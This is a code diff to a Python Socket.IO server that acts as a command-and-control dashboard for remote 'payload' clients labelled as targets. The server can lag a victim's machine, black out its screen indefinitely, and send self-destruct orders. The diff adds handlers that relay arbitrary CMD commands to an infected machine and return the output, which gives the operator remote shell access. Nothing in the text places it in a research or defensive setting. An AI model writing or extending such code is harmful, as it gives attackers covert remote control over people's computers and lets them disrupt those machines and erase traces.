@@ -4,6 +4,7 @@
 import os
 
 # --- EVENTLET CONFIGURATION ---
+# This must happen before other imports!
 if __name__ == "__main__":
     import eventlet
     eventlet.monkey_patch()
@@ -30,7 +31,7 @@ def check_offline_sessions():
         socketio.sleep(10)
         now = time.time()
         changed = False
-        for sid, data in sessions.items():
+        for sid, data in list(sessions.items()):
             if data['status'] == 'online' and now - data['last_seen'] > 30:
                 sessions[sid]['status'] = 'offline'
                 changed = True
@@ -46,6 +47,13 @@ def dashboard_connect():
     """Send current list to dashboard upon connection."""
     emit('session_list_update', sessions)
 
+@socketio.on('execute_command', namespace='/dashboard')
+def execute_command(data):
+    """Relay CMD command to payload"""
+    sid, command = data.get('session_id'), data.get('command')
+    if sid in sessions:
+        socketio.emit('run_command', {'command': command}, namespace='/payload', room=sid)
+
 @socketio.on('update_lag_state', namespace='/dashboard')
 def handle_lag(data):
     sid = data.get('session_id')
@@ -54,17 +62,13 @@ def handle_lag(data):
     if sid in sessions:
         sessions[sid]['lag_status'] = status
         sessions[sid]['lag_intensity'] = intensity
-        socketio.emit('command_update_lag', {'status': status, 'intensity': intensity}, namespace='/payload', room=sid)
+        socketio.emit('command_update_lag', data, namespace='/payload', room=sid)
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
 
 @socketio.on('update_blackout_state', namespace='/dashboard')
 def handle_blackout(data):
-    """
-    Handles the 'SCREEN' switch from dashboard.
-    Toggles indefinite black screen on payload.
-    """
     sid = data.get('session_id')
-    status = data.get('status') # 'on' or 'off'
+    status = data.get('status')
     if sid in sessions:
         sessions[sid]['blackout_status'] = status
         socketio.emit('command_blackout', {'status': status}, namespace='/payload', room=sid)
@@ -74,7 +78,7 @@ def handle_blackout(data):
 def delete_session(data):
     sid = data.get('session_id')
     if sid:
-        print(f"Server: Issuing KILL to {sid} and adding to blacklist.")
+        print(f"Server: Issuing KILL to {sid}")
         blacklist.add(sid)
         socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
         if sid in sessions:
@@ -90,11 +94,17 @@ def update_nametag(data):
 
 @socketio.on('clear_blacklist', namespace='/dashboard')
 def clear_blacklist(data):
-    print("Server: Received request to clear blacklist.")
+    print("Server: Clearing blacklist...")
     blacklist.clear()
-    print("Server: Blacklist has been cleared.")
 
 # --- Payload Namespace ---
+
+@socketio.on('command_result', namespace='/payload')
+def command_result(data):
+    """Relay CMD output back to dashboard"""
+    sid = data.get('session_id')
+    if sid in sessions:
+        socketio.emit('command_output', data, namespace='/dashboard')
 
 @socketio.on('payload_register', namespace='/payload')
 def payload_register(data):
@@ -103,43 +113,48 @@ def payload_register(data):
     if not sid: return
     
     if sid in blacklist:
-        print(f"Server: Blacklisted payload {sid} attempted connection. Re-issuing self-destruct.")
         join_room(sid)
         emit('command_self_destruct', {}, namespace='/payload', room=sid)
         return
 
     join_room(sid)
     
-    if sid not in sessions:
+    # Check if this is a status change (offline -> online) or new
+    is_new_status = False
+    if sid in sessions:
+        if sessions[sid]['status'] == 'offline':
+            is_new_status = True
+            sessions[sid]['status'] = 'online'
+    else:
+        is_new_status = True
         sessions[sid] = {
             'nametag': f'Target-{sid[:4]}', 
             'status': 'online', 
             'last_seen': time.time(), 
-            'lag_status': 'off',
+            'lag_status': 'off', 
             'lag_intensity': 5,
-            'blackout_status': 'off' # Default to screen ON (blackout OFF)
+            'blackout_status': 'off'
         }
-    else:
-        sessions[sid]['status'] = 'online'
-        sessions[sid]['last_seen'] = time.time()
-        
-    socketio.emit('session_list_update', sessions, namespace='/dashboard')
     
-    # Sync states immediately
-    emit('command_update_lag', {
-        'status': sessions[sid]['lag_status'], 
-        'intensity': sessions[sid]['lag_intensity']
-    }, namespace='/payload', room=sid)
+    sessions[sid]['last_seen'] = time.time()
     
-    emit('command_blackout', {
-        'status': sessions[sid]['blackout_status']
-    }, namespace='/payload', room=sid)
+    # Immediately notify dashboard if status changed
+    if is_new_status:
+        socketio.emit('session_list_update', sessions, namespace='/dashboard')
+    
+    # Sync states
+    emit('command_update_lag', {'status': sessions[sid]['lag_status'], 'intensity': sessions[sid]['lag_intensity']}, namespace='/payload', room=sid)
+    emit('command_blackout', {'status': sessions[sid]['blackout_status']}, namespace='/payload', room=sid)
 
 @socketio.on('payload_heartbeat', namespace='/payload')
 def heartbeat(data):
-    """Keep-alive signal from payload."""
     sid = data.get('session_id')
     if sid in sessions:
+        # If it was marked offline but is sending heartbeats, mark online immediately
+        if sessions[sid]['status'] == 'offline':
+            sessions[sid]['status'] = 'online'
+            socketio.emit('session_list_update', sessions, namespace='/dashboard')
+            
         sessions[sid]['last_seen'] = time.time()
     elif sid in blacklist:
         emit('command_self_destruct', {}, namespace='/payload', room=sid)
